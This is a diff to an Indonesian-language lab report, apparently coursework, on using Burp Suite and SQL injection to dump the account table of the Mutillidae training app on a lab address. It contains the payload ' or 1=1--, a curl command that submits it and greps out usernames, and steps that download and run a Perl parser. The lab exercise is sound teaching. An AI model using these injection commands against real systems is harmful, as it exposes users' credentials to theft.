@@ -35,9 +35,9 @@
    - Pilih tab proxy, kemudian options
    - Set port ke 8080 seperti berikut
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/proxy_port_8080.png "Home page")
-3. Turn on intercept
+3. Turn off intercept
    - Pilih tab intercept
-   - Pastikan intercept button dalam keadaan off "intercept is off"
+   - Pastikan intercept button dalam keadaan off (**intercept is off**)
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/intercept_off.png "Home page")
 
 ## SQL Injection: Obtain Userlist (Method #1)
@@ -48,7 +48,7 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/true.png "Home page")
 2. View Results
 	- Halaman selanjutnya akan memuat kumpulan data table account yang berupa username, password dan signature
-	- Perhatikan string yang ada pada url yang di hightlight '+or+1%3D1--+
+	- Perhatikan string yang ada pada url yang di hightlight `'+or+1%3D1--+`
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/result.png "Home page")
 3. View Post Data (With Burp Suite)
    - Klik pada Tab Proxy
@@ -76,7 +76,7 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/run_curl.png "Home page")
 
 ## Perl Parser
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
  ```
    cd /root
    curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep "Username=" > lesson7.txt
@@ -85,7 +85,7 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/cat_lesson.png "Home page")
 
 ## Download Parser
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
    ```
    cd /root
    wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT
@@ -95,7 +95,7 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/download_perl.png "Home page")
 
 ## Run Perl Script
-   - Buka terminal, jalankan perintah berikut :
+   - Jalankan perintah berikut pada terminal :
    ```
    ./lesson7.pl
    ```
